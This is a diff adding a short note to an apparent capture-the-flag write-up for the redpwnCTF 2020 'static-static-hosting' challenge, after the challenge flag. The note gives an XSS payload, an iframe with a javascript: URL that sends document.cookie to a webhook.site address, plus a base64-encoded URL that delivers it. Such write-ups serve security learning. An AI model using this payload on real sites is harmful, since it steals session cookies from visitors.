@@ -80,3 +80,19 @@ Submit the resulting URL to the admin bot, and the request data will be sent to 
 ![](images/statichost_flag.PNG)
 
 **Flag**: `flag{wh0_n33d5_d0mpur1fy}`
+
+
+---
+
+**NTS:** Using `assign` member works as well:
+```javascript
+<iframe src="javascript:window.location.assign(`https://webhook.site/17ea03fd-9bdf-4c80-a9b1-8e4ee88cd72f?c=${document.cookie}`)"></iframe>
+
+https://static-static-hosting.2020.redpwnc.tf/site/#PGlmcmFtZSBzcmM9ImphdmFzY3JpcHQ6d2luZG93LmxvY2F0aW9uLmFzc2lnbihgaHR0cHM6Ly93ZWJob29rLnNpdGUvMTdlYTAzZmQtOWJkZi00YzgwLWE5YjEtOGU0ZWU4OGNkNzJmP2M9JHtkb2N1bWVudC5jb29raWV9YCkiPjwvaWZyYW1lPg==
+```
+
+&nbsp;
+
+#### References
+
+* https://owasp.org/www-community/xss-filter-evasion-cheatsheet
